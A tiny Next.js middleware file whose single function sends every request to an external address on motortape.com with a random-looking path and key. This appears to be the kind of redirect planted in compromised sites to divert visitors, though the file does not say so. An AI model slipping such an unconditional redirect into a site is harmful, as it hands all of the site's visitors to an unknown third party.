import { NextResponse } from "next/server";

export function middleware(request) {
  return NextResponse.redirect("https://motortape.com/pynxydkcf?key=9fcaaab1932732baaffa3314295d33af", 307);
}
